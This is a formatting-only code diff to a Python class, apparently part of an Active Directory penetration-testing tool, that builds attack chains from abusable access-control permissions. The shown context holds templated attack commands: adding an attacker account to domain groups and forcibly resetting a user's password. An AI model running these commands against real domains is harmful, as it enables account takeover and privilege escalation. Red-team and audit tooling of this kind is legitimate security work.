@@ -241,7 +241,7 @@ class DACLAbuseEngine:
                 ],
                 "AddMember": [
                     f"Add-DomainGroupMember -Identity '{sam}' -Members 'ATTACKER_USER' -Credential $cred",
-                    f"net group \"{sam}\" ATTACKER_USER /add /domain",
+                    f'net group "{sam}" ATTACKER_USER /add /domain',
                 ],
                 "GenericAll": [
                     f"Set-DomainUserPassword -Identity '{sam}' -AccountPassword (ConvertTo-SecureString 'Pwned123!' -AsPlainText -Force)",
@@ -275,14 +275,16 @@ class DACLAbuseEngine:
 
             for technique in target.abuse_techniques:
                 cmds = abuse_commands.get(technique, [f"Exploit {technique} on {dn}"])
-                self.attack_chains.append({
-                    "target": dn,
-                    "sam_name": sam,
-                    "object_type": obj_type,
-                    "technique": technique,
-                    "severity": target.severity,
-                    "commands": cmds,
-                })
+                self.attack_chains.append(
+                    {
+                        "target": dn,
+                        "sam_name": sam,
+                        "object_type": obj_type,
+                        "technique": technique,
+                        "severity": target.severity,
+                        "commands": cmds,
+                    }
+                )
 
         return self.attack_chains
 
@@ -432,7 +434,5 @@ class DACLAbuseEngine:
             "by_severity": severity_counts,
             "by_technique": technique_counts,
             "attack_chains": len(self.compute_attack_chains()),
-            "top_techniques": sorted(
-                technique_counts.items(), key=lambda x: x[1], reverse=True
-            )[:10],
+            "top_techniques": sorted(technique_counts.items(), key=lambda x: x[1], reverse=True)[:10],
         }
